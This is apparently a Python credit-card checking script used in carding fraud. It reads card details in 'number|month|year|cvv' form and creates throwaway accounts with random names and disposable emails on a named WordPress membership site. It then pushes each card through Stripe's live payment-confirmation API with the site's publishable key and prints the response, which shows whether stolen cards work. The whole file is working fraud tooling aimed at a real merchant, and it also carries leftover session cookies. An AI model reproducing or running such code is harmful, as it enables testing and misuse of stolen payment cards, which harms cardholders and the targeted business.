import httpx
import random,string

async def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    


def generate_username(length=14):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

async def checks(fullz,session):
    cc,mes,ano,cvv = fullz.split("|")
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryUGyMQew65A6I2vzx',
    'Origin': 'https://edhatwp.managedcoder.com',
    'Referer': 'https://edhatwp.managedcoder.com/register/monthly-subscription/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    files = {
        'mepr_process_signup_form': (None, 'Y'),
        'mepr_product_id': (None, '5874'),
        'user_first_name': (None, 'And'),
        'user_last_name': (None, 'smm'),
        'mepr_membership': (None, 'individual'),
        'mepr_community': (None, 'new-haven'),
        'mepr_discovery': (None, 'another-website'),
        'mepr-geo-country': (None, ''),
        'user_login': (None, generate_username()),
        'user_email': (None, f'{generate_username()}@eurokool.com'),
        'mepr_user_password': (None, '123@Password'),
        'mepr_user_password_confirm': (None, '123@Password'),
        'mepr_coupon_code': (None, ''),
        'mepr_payment_method': (None, 'rjbtub-6ku'),
        'mepr_no_val': (None, ''),
    }

    response = await session.post(
        'https://edhatwp.managedcoder.com/register/monthly-subscription/',
        headers=headers,
        files=files,
    )
    trans = await find_between(response.text, 'name="mepr_transaction_id" value="', '"')

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryn9TwQrUWfqFDz43m',
    # 'Cookie': 'wordpress_sec_55e3469bcfa8a26a44d3d84a0f5d34c8=dbfsjfbds%7C1713267441%7CtE1IWQ1j5nmgh3D9fQQwxyALIUSRVF2GAx8Z07IrGUX%7C6ccccf980d1630a464525d36e7ba78bd107ffd33abc6ff7db0f2ef209fe943a7; PHPSESSID=8bcd663b5265de8b5cf6fd04ed72e419; _ga=GA1.1.1872967541.1713094609; __stripe_mid=50c6cb6a-a42a-428b-b809-35834b24939bae3f1c; __stripe_sid=ef3c07d9-bc8b-4b53-9573-2344299615a1b8e757; wordpress_logged_in_55e3469bcfa8a26a44d3d84a0f5d34c8=dbfsjfbds%7C1713267441%7CtE1IWQ1j5nmgh3D9fQQwxyALIUSRVF2GAx8Z07IrGUX%7C86f2ea7e6b21d2ff8ab73860a8d09bccad7eed0a3ed3c598f2fd8a66a7ce2634; _ga_N79CWWYZ9T=GS1.1.1713094609.1.1.1713094637.0.0.0',
    'Origin': 'https://edhatwp.managedcoder.com',
    'Referer': 'https://edhatwp.managedcoder.com/register/monthly-subscription/?action=checkout&txn=c',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'cache-control': 'no-cache',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    files = {
        'mepr_transaction_id': (None, trans),
        'address_required': (None, '0'),
        'card-first-name': (None, 'And'),
        'card-last-name': (None, 'smm'),
        'action': (None, 'mepr_stripe_confirm_payment'),
        'mepr_current_url': (None, 'https://edhatwp.managedcoder.com/register/monthly-subscription/?action=checkout&txn=c#mepr_jump'),
    }

    response = await session.post('https://edhatwp.managedcoder.com/wp-admin/admin-ajax.php',  headers=headers, files=files)
    client_secret = response.json()["client_secret"]
    return_url = response.json()["return_url"]
    pi = await find_between(response.text, '"client_secret":"', '_secret')

    headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    data = {
        'return_url':return_url,
        'payment_method_data[billing_details][address][country]':'IN',
        'payment_method_data[billing_details][email]':'ultrahostbypremium@eurokool.com',
        'payment_method_data[billing_details][name]':'And smm',
        'payment_method_data[type]':'card',
        'payment_method_data[card][number]':cc,
        'payment_method_data[card][cvc]':cvv,
        'payment_method_data[card][exp_year]':ano,
        'payment_method_data[card][exp_month]':mes,
        'payment_method_data[allow_redisplay]':'unspecified',
        'payment_method_data[pasted_fields]':'number',
        'payment_method_data[payment_user_agent]':'stripe.js/327b5a4b1f; stripe-js-v3/327b5a4b1f; payment-element; deferred-intent',
        'payment_method_data[referrer]':'https://edhatwp.managedcoder.com',
        'payment_method_data[time_on_page]':'199709',
        'payment_method_data[client_attribution_metadata][client_session_id]':'dc7fb132-472f-4a34-bfdf-2bf85d16403b',
        'payment_method_data[client_attribution_metadata][merchant_integration_source]':'elements',
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]':'payment-element',
        'payment_method_data[client_attribution_metadata][merchant_integration_version]':'2021',
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]':'deferred',
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]':'merchant_specified',
        'payment_method_data[guid]':'64e7174c-3327-4b4e-bf99-eaa640855c6b62118c',
        'payment_method_data[muid]':'50c6cb6a-a42a-428b-b809-35834b24939bae3f1c',
        'payment_method_data[sid]':'ef3c07d9-bc8b-4b53-9573-2344299615a1b8e757',
        'expected_payment_method_type':'card',
        'client_context[currency]':'usd',
        'client_context[mode]':'subscription',
        'client_context[payment_method_types][0]':'card',
        'client_context[payment_method_types][1]':'link',
        'client_context[setup_future_usage]':'off_session',
        'use_stripe_sdk':'false',
        'key':'pk_live_51BQ4AaKbla2hzrCr2kTCMd79erEBupAvq8uM4iCRJwwbo8JkNFxmCgT55JA0k4jJSWSEqZzDb6DtKobdmgsx9rBw008dqO8ZjO',
        '_stripe_version':'2022-11-15',
        'client_secret':client_secret,
    }
    response = await session.post(
        f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
        headers=headers,
        data=data,
    )
    print(response.text)
    return response


